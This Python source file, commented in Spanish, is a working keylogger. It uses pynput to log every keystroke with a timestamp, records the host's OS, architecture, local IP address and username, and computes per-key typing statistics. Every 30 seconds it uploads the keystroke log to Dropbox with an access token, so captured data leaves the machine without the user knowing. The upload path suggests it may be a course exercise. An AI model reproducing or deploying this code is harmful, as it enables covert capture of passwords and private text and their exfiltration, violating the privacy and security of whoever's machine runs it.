from pynput.keyboard import Key, Listener
import time, datetime, threading, smtplib, struct, platform, socket, getpass, tempfile, dropbox, os

architecture = struct.calcsize('P')*8
operative_system = (getattr(platform,'platform'))()
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(("8.8.8.8",80))
ip_dir = s.getsockname()[0]
s.close()

username=getpass.getuser()
new_list=[]
aux=0
keys=[]
cant_press=[]
instant_ini=[]
instant_end=[]
current_average=[]
info_keys=[keys, cant_press, instant_ini, instant_end, current_average,0,0]
now = datetime.datetime.now()
now = str(now.year)+str(now.month)+str(now.day)+str(now.hour)+str(now.minute)+str(now.second)+str(now.microsecond)
name="log"+now+".txt"
filename = open(name,"w")
filename.write("arquitectura: "+str(architecture)+"bits"+"\n")
filename.write("sistema operativo: "+str(operative_system)+"\n")
filename.write("direccion IP: "+str(ip_dir)+"\n")
filename.write("Nombre de usuario: "+str(username)+"\n")
filename.close()

def GetInfoKeys(keys_list, conf):
    global new_list
    if conf == 'set':
        new_list = keys_list
    elif conf == 'get':
        return(new_list)

def write_file(TIME, KEY, filename):
    with open(filename, 'a') as new_file:
        new_file.write(str(TIME))
        new_file.write(" ")
        new_file.write(str(KEY))
        new_file.write("\n")
        new_file.close()
    
def on_press(key):
    global aux
    TIME = time.time()
    Time=str(datetime.datetime.now())
    write_file(Time, key, name)
    if len(info_keys[0])==0:
        info_keys[5]=1
        aux=TIME
    else:
        info_keys[5]=info_keys[5]+1
        info_keys[6]=TIME-float(aux)
    
    if key not in info_keys[0]:
        info_keys[0].append(key)
        info_keys[1].append(1)
        info_keys[2].append(TIME)
        info_keys[3].append(TIME)
        info_keys[4].append(0)
    else:
        for i in info_keys[0]:
            if i == key:
                position=info_keys[0].index(key)
                info_keys[1][position]=info_keys[1][position]+1
                info_keys[3][position]=TIME
                info_keys[4][position]=info_keys[1][position]/(info_keys[3][position]-info_keys[2][position])
    GetInfoKeys(info_keys, 'set')

def sendDropbox():
    now_aux = datetime.datetime.now()
    now_aux = str(now_aux.year)+str(now_aux.month)+str(now_aux.day)+str(now_aux.hour)+str(now_aux.minute)+str(now_aux.second)+str(now_aux.microsecond)
    set_list=[]
    set_list = GetInfoKeys(set_list, 'get')
    print(set_list)
    if len(set_list)>0:
        file_info = open("InfoFile"+now_aux+".txt", "w")
        for key_base in set_list[0]:
            position = set_list[0].index(key_base)
            file_info.write("informacion de la tecla "+str(set_list[0][position])+":\n")
            file_info.write("frecuencia: "+str("{:.3f}".format(set_list[4][position]))+"pulsasiones/segundo\n")
            file_info.write("porcentaje del total de pulsaciones: "+str("{:.3f}".format(100*set_list[1][position]/set_list[5]))+"%"+"\n")
            file_info.write("porcentaje del total de tiempo: "+str("{:.3f}".format(100*(set_list[3][position]-set_list[2][position])/set_list[6]))+"%"+"\n")
            file_info.write("\n")
        file_info.close()
        cliente = dropbox.Dropbox('dropbox token access')
        cliente.files_upload(open("log"+now+".txt", 'rb').read(), '/examen'+now_aux+'/'+"log"+now+".txt")
    timer = threading.Timer(30, sendDropbox)
    timer.start()

def on_realese(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_realese) as listener:
    sendDropbox()
    listener.join()
